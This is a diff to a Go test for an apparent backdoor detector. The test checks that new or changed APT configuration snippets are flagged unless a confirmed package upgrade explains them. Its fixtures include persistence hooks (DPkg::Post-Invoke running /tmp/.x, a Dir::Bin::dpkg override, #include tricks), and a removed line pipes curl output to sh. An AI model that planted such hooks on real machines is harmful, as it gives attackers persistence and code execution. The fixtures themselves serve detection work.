@@ -314,56 +314,64 @@ func aptConf(p string, lines ...string) model.PersistFile {
 	return model.PersistFile{Path: p, Kind: model.PersistKindAptConf, Mode: 0o100644, SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
 }
 
-// /etc/apt/apt.conf.d: maintainer scripts rewrite 20auto-upgrades and
-// 50unattended-upgrades through ucf, which no package owns. A change there
-// is a backdoor sign only when the file now holds something APT or dpkg
-// runs (an Invoke hook, Pre-Install-Pkgs) or a replaced program
-// (Dir::Bin); anything else is a note.
-func TestJudgeAptConfRankedByContent(t *testing.T) {
+// /etc/apt/apt.conf.d: any new or changed snippet is a backdoor sign unless
+// a confirmed change of the package that ships it explains it. What the file
+// says never lowers that: a hook can hide behind an #include, or in blocks
+// split so that no line names it.
+func TestJudgeAptConfIsPersistenceWhateverItSays(t *testing.T) {
 	const auto = "/etc/apt/apt.conf.d/20auto-upgrades"
+	base := []string{`APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "1";`}
 	old := clean()
-	old.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "1";`)}
-	cur := clone(old)
-	cur.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "0";`)}
-	f := must(t, run(cur, snapOf(old), nil), "snap.persist:"+auto, model.SevNote)
-	if !strings.Contains(f.Why, "hook") {
-		t.Errorf("why %q", f.Why)
-	}
-	// A new snippet without a hook.
-	added := clone(old)
-	added.Persist = append(added.Persist, aptConf("/etc/apt/apt.conf.d/50unattended-upgrades", `Unattended-Upgrade::Mail "root";`))
-	must(t, run(added, snapOf(old), nil), "snap.persist:/etc/apt/apt.conf.d/50unattended-upgrades", model.SevNote)
-
-	for _, hook := range []string{
-		`DPkg::Post-Invoke { "/tmp/.x"; };`,
-		`DPkg::Pre-Invoke {"curl -s http://x | sh";};`,
-		`APT::Update::Pre-Invoke { "/tmp/.x"; };`,
-		`APT::Update::Post-Invoke-Success { "/tmp/.x"; };`,
-		`DPkg::Pre-Install-Pkgs { "/tmp/.x"; };`,
-		`apt::update::post-invoke { "/tmp/.x"; };`,
-		`Dir::Bin::dpkg "/tmp/dpkg";`,
-		`Dir::Bin::Methods "/tmp/m";`,
-		`Dir { Bin { dpkg "/tmp/dpkg"; }; };`,
+	old.Persist = []model.PersistFile{aptConf(auto, base...)}
+	for name, lines := range map[string][]string{
+		"a setting changed":       {base[0], `APT::Periodic::Unattended-Upgrade "0";`},
+		"an include":              append(slices.Clone(base), `#include "/var/tmp/x.conf";`),
+		"a split Dir Bin block":   append(slices.Clone(base), `Dir {`, `  Bin {`, `    dpkg "/tmp/dpkg";`, `  };`, `};`),
+		"a hook":                  append(slices.Clone(base), `DPkg::Post-Invoke { "/tmp/.x"; };`),
+		"a split hook block":      append(slices.Clone(base), `DPkg {`, `  Post-Invoke {`, `    "/tmp/.x";`, `  };`, `};`),
+		"a clear with an include": append(slices.Clone(base), `#clear DPkg::Post-Invoke;`, `#include /etc/apt/x;`),
 	} {
-		// Added to an existing snippet.
 		c := clone(old)
-		c.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "1";`, hook)}
+		c.Persist = []model.PersistFile{aptConf(auto, lines...)}
 		must(t, run(c, snapOf(old), nil), "snap.persist:"+auto, model.SevBackdoor)
-		// In a new snippet.
+		// The same as a new snippet.
 		c = clone(old)
-		c.Persist = append(c.Persist, aptConf("/etc/apt/apt.conf.d/99zz", hook))
+		c.Persist = append(c.Persist, aptConf("/etc/apt/apt.conf.d/99zz", lines...))
 		must(t, run(c, snapOf(old), nil), "snap.persist:/etc/apt/apt.conf.d/99zz", model.SevBackdoor)
+		_ = name
 	}
-	// A hook that was there, with the command under it changed.
-	was := clone(old)
-	was.Persist = []model.PersistFile{aptConf(auto, `DPkg::Post-Invoke {`, `  "/usr/bin/true";`, `};`)}
-	now := clone(old)
-	now.Persist = []model.PersistFile{aptConf(auto, `DPkg::Post-Invoke {`, `  "/tmp/.x";`, `};`)}
-	must(t, run(now, snapOf(was), nil), "snap.persist:"+auto, model.SevBackdoor)
-	// Its text was not kept: nothing says it holds no hook.
-	blind := clone(old)
-	blind.Persist = []model.PersistFile{{Path: auto, Kind: model.PersistKindAptConf, Mode: 0o100644, SHA256: h("big"), MTime: changed}}
-	must(t, run(blind, snapOf(old), nil), "snap.persist:"+auto, model.SevBackdoor)
+	// A visible hook is pointed out, as evidence only.
+	c := clone(old)
+	c.Persist = []model.PersistFile{aptConf(auto, append(slices.Clone(base), `DPkg::Post-Invoke { "/tmp/.x"; };`)...)}
+	f := must(t, run(c, snapOf(old), nil), "snap.persist:"+auto, model.SevBackdoor)
+	if !slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return strings.Contains(e.Detail, "hook") }) {
+		t.Errorf("the hook is not pointed out: %+v", f.Evidence)
+	}
+
+	// A snippet that a confirmed upgrade of its own package reset to the
+	// package's default is explained, as any conffile is.
+	const p = "/etc/apt/apt.conf.d/50unattended-upgrades"
+	was := clean()
+	for i := range was.Packages.Installed {
+		if pk := &was.Packages.Installed[i]; pk.Name == "unattended-upgrades" {
+			pk.Files = append(pk.Files, p)
+		}
+	}
+	was.Persist = []model.PersistFile{aptConf(p, `Unattended-Upgrade::Mail "";`)}
+	was.Files = append(was.Files, file(p, `Unattended-Upgrade::Mail "";`, 0o644))
+	now := clone(was)
+	setVersion(now, "unattended-upgrades", "2.9.1+nmu4")
+	nf := file(p, `Unattended-Upgrade::Mail "root";`, 0o644)
+	setFile(now, nf)
+	now.Persist = []model.PersistFile{aptConf(p, `Unattended-Upgrade::Mail "root";`)}
+	now.Persist[0].SHA256 = nf.SHA256
+	res := archive()
+	res.ConffileDefaults = []pkgverify.FileVerdict{{Path: p, Package: "unattended-upgrades", Version: "2.9.1+nmu4", Expected: nf.SHA256, Actual: nf.SHA256, Source: "archive", Kind: pkgverify.KindConffileDefault}}
+	r := run(now, snapOf(was), res)
+	absent(t, r, "snap.persist:"+p)
+	// Rewritten by the maintainer script to something else: for the owner
+	// to accept.
+	must(t, run(now, snapOf(was), archive()), "snap.persist:"+p, model.SevBackdoor)
 }
 
 // More places that decide what is trusted or what every session runs.
